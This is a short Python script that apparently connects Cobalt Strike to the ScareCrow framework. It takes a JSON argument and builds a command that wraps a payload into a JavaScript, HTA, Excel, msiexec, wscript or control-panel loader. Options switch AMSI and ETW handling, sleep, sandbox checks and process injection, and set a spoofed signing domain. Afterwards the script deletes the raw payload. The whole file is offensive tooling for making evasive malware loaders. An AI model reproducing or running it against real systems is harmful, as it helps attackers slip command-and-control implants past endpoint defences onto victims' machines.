#!/usr/bin/python3
import os.path
from json import loads
from sys import argv, exit
from subprocess import call, DEVNULL, STDOUT


def generate_payload(data):

    call(["rm", "-r", "{}/.lib".format(data['script_path'])], stdout=DEVNULL, stderr=STDOUT)

    command = [data['scarecrow_executable'], '-I', data['payload'], '-Loader', data['loader'], '-domain', data['domain']]

    if data['noamsi'] == 'true':
        command.append('-noamsi')

    if data['noetw'] == 'true':
        command.append('-noetw')

    if data['nosleep'] == 'true':
        command.append('-nosleep')

    if data['sandbox'] == 'true':
        command.append('-sandbox')

    if data['injection']:
        command.append('-injection')
        command.append('{}'.format(data['injection']))

    command.append('-outpath')
    command.append('{}'.format(os.path.dirname(data['payload'])))

    if data['loader_name']:
        if not data['loader_name'].endswith('.js') and not data['loader_name'].endswith('.hta'):
            response_message("[!] Please select .js or .hta loader for the payload.")
        command.append('-O')
        command.append(data['loader_name'])

    filename = "Loader.js"
    if data['loader_name'] and data['loader'] in ["control", "excel", "msiexec", "wscript"]:
        filename = data['loader_name']
    elif not data['loader_name'] and data['loader'] in ["excel", "msiexec", "wscript"]:
        command.append('-O')
        command.append(filename)

    call(command, stdout=DEVNULL, stderr=STDOUT)
    call(["rm", data['payload']], stdout=DEVNULL, stderr=STDOUT)

    response_message("Payload successfuly generated at: " + os.path.dirname(data['payload']))


def response_message(message):
    print(message)
    exit()


if __name__ == '__main__':
    cobaltstrike_data = loads(argv[1:][0])

    generate_payload(cobaltstrike_data)
